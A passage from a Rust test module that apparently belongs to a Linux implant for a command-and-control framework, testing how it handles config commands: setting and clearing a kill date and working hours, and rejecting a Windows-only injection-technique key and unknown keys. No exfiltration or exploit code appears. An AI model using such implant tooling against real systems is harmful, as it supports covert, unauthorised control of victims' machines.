            panic!("unexpected callbacks: {callbacks:?}");
        };
        assert_eq!(*command_id, u32::from(DemonCommand::CommandConfig));
        assert_eq!(*request_id, 10);

        let mut offset = 0;
        assert_eq!(read_u32(payload, &mut offset), 154);
        assert_eq!(read_u64(payload, &mut offset), 1_700_000_000);
    }

    #[tokio::test]
    async fn config_kill_date_zero_clears_state() {
        let payload = config_payload(154, &0_i64.to_le_bytes());
        let package = DemonPackage::new(DemonCommand::CommandConfig, 11, payload);
        let mut state = PhantomState::default();
        state.kill_date = Some(1_700_000_000);

        execute(&package, &mut state).await.expect("execute");

        assert_eq!(state.kill_date(), None);
    }

    #[tokio::test]
    async fn config_working_hours_sets_state_and_echoes_back() {
        // Enable flag (bit 22) + start 09:00 (9<<17 | 0<<11) + end 17:00 (17<<6 | 0<<0)
        let hours: i32 = (1 << 22) | (9 << 17) | (0 << 11) | (17 << 6) | 0;
        let payload = config_payload(155, &hours.to_le_bytes());
        let package = DemonPackage::new(DemonCommand::CommandConfig, 12, payload);
        let mut state = PhantomState::default();

        execute(&package, &mut state).await.expect("execute");

        assert_eq!(state.working_hours(), Some(hours));

        let callbacks = state.drain_callbacks();
        let [PendingCallback::Structured { command_id, request_id, payload }] =
            callbacks.as_slice()
        else {
            panic!("unexpected callbacks: {callbacks:?}");
        };
        assert_eq!(*command_id, u32::from(DemonCommand::CommandConfig));
        assert_eq!(*request_id, 12);

        let mut offset = 0;
        assert_eq!(read_u32(payload, &mut offset), 155);
        assert_eq!(read_u32(payload, &mut offset), hours as u32);
    }

    #[tokio::test]
    async fn config_working_hours_zero_clears_state() {
        let payload = config_payload(155, &0_i32.to_le_bytes());
        let package = DemonPackage::new(DemonCommand::CommandConfig, 13, payload);
        let mut state = PhantomState::default();
        state.working_hours = Some(12345);

        execute(&package, &mut state).await.expect("execute");

        assert_eq!(state.working_hours(), None);
    }

    #[tokio::test]
    async fn config_windows_only_key_returns_error() {
        // InjectTechnique (150) is Windows-only
        let payload = config_payload(150, &42_i32.to_le_bytes());
        let package = DemonPackage::new(DemonCommand::CommandConfig, 14, payload);
        let mut state = PhantomState::default();

        execute(&package, &mut state).await.expect("execute");

        let callbacks = state.drain_callbacks();
        let [PendingCallback::Error { request_id, text }] = callbacks.as_slice() else {
            panic!("unexpected callbacks: {callbacks:?}");
        };
        assert_eq!(*request_id, 14);
        assert!(text.contains("not supported on Linux"));
    }

    #[tokio::test]
    async fn config_unknown_key_returns_error() {
        let payload = config_payload(9999, &[]);
        let package = DemonPackage::new(DemonCommand::CommandConfig, 15, payload);
        let mut state = PhantomState::default();

        execute(&package, &mut state).await.expect("execute");

        let callbacks = state.drain_callbacks();
        let [PendingCallback::Error { request_id, text }] = callbacks.as_slice() else {
            panic!("unexpected callbacks: {callbacks:?}");
        };
        assert_eq!(*request_id, 15);
        assert!(text.contains("unknown config key"));
    }
}
